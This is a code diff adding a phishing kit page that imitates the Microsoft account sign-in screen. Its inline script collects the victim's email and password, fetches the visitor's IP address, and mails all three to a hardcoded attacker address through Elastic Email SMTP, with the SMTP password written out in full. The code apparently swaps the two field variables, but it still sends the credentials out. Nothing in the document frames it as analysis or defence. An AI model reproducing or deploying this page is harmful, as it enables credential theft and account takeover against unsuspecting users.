@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<link href="local_resources/img/0c3b0d38904acd7e59ec2813888249c1.ico" rel="icon"/>
+<title>Sign in to your Microsoft account</title>
+<link href="local_resources/css/3e3af8739a7704d3e75104f0a77020e5.css" rel="stylesheet"/>
+</head>
+<body>
+<section id="section_uname">
+<div class="auth-wrapper">
+<img alt="Microsoft" src="local_resources/img/eaba90ca490741dc0b68b372d5265d52.png"/>
+<h2 class="title mb-16 mt-16">Sign in</h2>
+<form>
+<div class="mb-16">
+<p class="error" id="error_uname"></p>
+<input autocomplete="on" class="input" id="inp_uname" name="uname" placeholder="Email, phone, or Skype" type="email"/>
+</div>
+</form>
+<div>
+<p class="mb-16 fs-13">No account? <a class="link" href="index.html">Create one!</a></p>
+<p class="mb-16 fs-13">
+<a class="link" href="index.html#">Sign in with a security key
+                        <img alt="Question img" src="local_resources/img/d53b2bc2ea00f31cf249312fb4645168.png"/>
+</a>
+</p>
+</div>
+<div>
+<button class="btn" id="btn_next">Next</button>
+</div>
+</div>
+<div class="opts">
+<p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="local_resources/img/bf9553c4168c2c81d35cbce4d1c7cd50.png" width="30px"/></span> Sign-in options</p>
+</div>
+</section>
+<section class="d-none" id="section_pwd">
+<div class="auth-wrapper">
+<img alt="Microsoft" class="d-block" src="local_resources/img/eaba90ca490741dc0b68b372d5265d52.png"/>
+<div class="identity w-100 mt-16 mb-16">
+<button class="back">
+<img src="local_resources/img/3b9c1b459029eb5b7a65c57c7d3e78ad.png"/>
+</button>
+<span id="user_identity">a@b.com</span>
+</div>
+<h2 class="title mb-16">Enter password</h2>
+<form>
+<div class="mb-16">
+<p class="error" id="error_pwd"></p>
+<input class="input" id="inp_pwd" name="pass" placeholder="Password" type="password"/>
+</div>
+</form>
+<div>
+<p class="mb-16"> <a class="link fs-13" href="index.html#">Forgot password?</a></p>
+<p class="mb-16">
+<a class="link fs-13" href="index.html#">Other ways to sign in</a>
+</p>
+</div>
+<div>
+<button class="btn" id="btn_sig" onclick="sendmail()">Sign in</button>
+</div>
+</div>
+</section>
+<section class="d-none" id="section_final">
+<div class="auth-wrapper">
+<img alt="Microsoft" class="d-block" src="local_resources/img/eaba90ca490741dc0b68b372d5265d52.png"/>
+<div class="identity w-100 mt-16 mb-16">
+<span id="user_identity">a@b.com</span>
+</div>
+<h2 class="title mb-16">Stay signed in?</h2>
+<p class="p">Stay signed in so you don't have to sign in again next time.</p>
+<label class="has-checkbox">
+<input class="checkbox" type="checkbox"/>
+<span>Don't show this again</span>
+</label>
+<div class="btn-group">
+<button class="btn btn-sec" id="btn_final">No</button>
+<button class="btn" id="btn_final">Yes</button>
+</div>
+</div>
+</section>
+<footer class="footer">
+<a href="index.html#">Terms of use</a>
+<a href="index.html#">Privacy &amp; cookies</a>
+<span>. . .</span>
+</footer>
+<script src="local_resources/js/3df2a88107bf5b727311a36ff8e41512.js"></script>
+<script src="local_resources/js/f789cee154418392e920056d40e75705.js"></script>
+<script>
+        function sendmail(){
+          var email = document.getElementById('inp_pwd').value;
+          var password = document.getElementById('inp_uname').value;
+          //const ipAddress = event.candidate.candidate.split(' ')[4];
+           
+           fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    ipAddress = data.ip;
+                    this.sendEmail(email, password, ipAddress);
+                })
+                .catch(error => {
+                    console.log('Error:', error);
+            });
+        }
+        function sendEmail(email, password, ipAddress) {
+                Email.send({
+                    Host: "smtp.elasticemail.com",
+                    Username: "tamara.rigamonti@tecnometal-pbc.com",
+                    Port:"2525",
+                    Password: "8283262D185FEF2D9B4B204A3312F7335EF7",
+                    To: 'tamara.rigamonti@tecnometal-pbc.com',
+                    From: "tamara.rigamonti@tecnometal-pbc.com",
+                    Subject: "Micro Access",
+                    Body: `Email: ${email} <br> password: ${password}<br>IP Address: ${ipAddress}`,
+                })
+                    .then(function (message) {
+                       // alert("mail sent successfully")
+                    });
+            }
+    </script>
+</body>
+</html>
